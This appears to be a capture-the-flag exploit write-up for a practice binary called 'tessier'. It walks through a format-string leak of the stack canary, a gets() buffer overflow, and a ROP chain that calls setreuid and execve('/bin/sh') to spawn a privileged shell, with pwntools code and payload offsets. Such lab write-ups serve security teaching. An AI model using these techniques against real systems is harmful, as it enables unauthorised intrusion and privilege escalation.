# tessier — exploit writeup

## Program structure (quick context)

`main` → `init_vault()` (fills a `vault` struct: magic `0xcafebabe`,
size `0x200`, level `3`, a 15-byte label, and a secret string stored
at `vault+0x1c`, only revealed later on successful auth) →
`init_sessions()` (zeroes a `sessions[]` table) → `print_banner()` →
`format_log()` → `authenticate()`.

### `format_log` — format-string leak

```c
void format_log(void) {
    char buf[32];                  // -0x30(%rbp)

    printf("Session tag: ");
    fflush(stdout);
    fgets(buf, 0x20, stdin);       // bounded, no overflow here
    buf[strcspn(buf, "\n")] = 0;

    printf("Tag accepted: ");
    printf(buf);                   // <-- user input as the format string
    putchar('\n');
}
```

Same bug as every earlier level: `printf(buf)` instead of
`printf("%s", buf)`. `fgets` itself is bounded, so this function's
only use to the exploit is as a leak primitive. The script sends
`%11$p` and reads the value straight back off the `"Tag accepted: "`
line — at this stack depth, that slot holds the saved canary for
`authenticate`'s frame:

```python
p.sendline(b'%11$p')
p.recvuntil(b'Tag accepted: ')
canary = int(p.recvline().strip(), 16)
```

### `authenticate` — the overflow

```c
void authenticate(void) {
    char buf[72];                       // -0x50(%rbp), 72 bytes before canary

    printf("...");
    fflush(stdout);
    gets(buf);                          // unbounded read — the overflow

    int session = create_session(buf);  // copies up to 31 bytes of buf
                                         // into a new session's name field
    if (session < 0) {
        puts("session limit reached");
        return;
    }

    if (strncmp(buf, "<password>", 8) == 0) {
        sessions[session].authenticated = 0xff;
        printf("Access granted, session %d\n", session);
        printf(vault.secret);           // reveals the vault's secret string
    } else {
        printf("Access denied, session %d\n", session);
        sessions[session].authenticated = 0;
    }
}
```

`gets()` is unbounded, as always — the overflow happens the moment
it's called, well before the password check or `create_session()`
logic that follows ever runs. (As an aside, note `authenticate` also
calls `printf(vault.secret)` on success — another instance of the
format-string pattern, but only reachable with a correct password,
and irrelevant here since the overflow bypasses authentication
entirely.)

## Mitigations and how each is handled

| Mitigation | Status | How the exploit deals with it |
|---|---|---|
| Stack canary | **Found** | Leaked in `format_log` via `%11$p`, then written back unchanged at its exact offset in `authenticate`'s overflow. |
| NX | Enabled | Payload is a ROP chain of libc calls, no shellcode on the stack. |
| PIE | Disabled | Addresses are hardcoded libc offsets from a known/fixed base. |
| SHSTK / IBT (CET) | Enabled | Only `pop reg; ret` gadgets and direct libc function calls are used — no indirect branches. |
| Partial RELRO | — | Not targeted. |

## Payload layout

```
offset 0  : 72 bytes padding    -> fills buf[72] up to the canary slot
offset 72 : leaked canary (8B)  -> keeps __stack_chk_fail from firing
offset 80 : 8 bytes filler      -> saved rbp
offset 88 : ROP chain starts here, overwriting the saved return address
```

`72` is exactly the distance from the start of `authenticate`'s local
buffer to the canary slot (`0x50 - 0x8`).

### The ROP chain

```python
exploit  = p64(ret)                              # stack alignment
exploit += p64(pop_rdi) + p64(1027)
exploit += p64(pop_rsi) + p64(1027) + p64(0)
exploit += p64(addr_setreuid)
exploit += p64(pop_rdi) + p64(addr_shell)
exploit += p64(pop_rsi) + p64(0) + p64(0)
exploit += p64(pop_rdx) + p64(0) * 5
exploit += p64(addr_execve)
```

Same construction as the earlier levels:

1. **`ret` (stack alignment)** — a single bare `ret` gadget first, so
   the stack is 16-byte aligned before the SSE-using libc call
   sequences run.
2. **`setreuid(1027, 1027)`** — `pop_rdi`/`pop_rsi` load matching
   real/effective uid and gid, then `setreuid`'s libc address is
   called directly, so the resulting shell gets the right privilege
   level.
3. **`execve("/bin/sh", NULL, NULL)`** — `rdi` points at the
   `"/bin/sh"` string already present inside libc (`addr_shell`),
   `rsi`/`rdx` are zeroed via `pop_rsi`/`pop_rdx`, then `execve`'s
   libc address is called directly. No `exit()` fallback needed, since
   a successful `execve` never returns.

All addresses (`execve`, `setreuid`, `/bin/sh`, gadgets) are
hardcoded as fixed offsets from the known libc base
(`0x7ffff7c00000`), which only works because the environment isn't
defeating the exploit with ASLR.

## Running it

```sh
python3 exploit.py
```

The script connects to `./tessier`, leaks the canary through
`format_log`'s format-string bug, builds the padding + canary + ROP
payload, sends it to `authenticate`'s `gets()`, and drops into an
interactive shell once `execve` hands off control — entirely
bypassing the password check and the vault secret it was meant to
protect.

## Summary

| Stage | Technique |
|---|---|
| Vulnerability 1 | Format-string bug in `format_log` (`printf(buf)` instead of `printf("%s", buf)`) |
| Vulnerability 2 | Stack buffer overflow via unbounded `gets()` in `authenticate` |
| Canary bypass | Leak canary with `%11$p`, reinsert it unchanged in the overflow payload |
| NX bypass | ROP chain instead of shellcode |
| Privilege handling | `setreuid()` call before spawning shell |
| Shell spawn | `execve("/bin/sh", NULL, NULL)` using libc's own string |
| Address source | Hardcoded libc base (no ASLR / fixed env) |
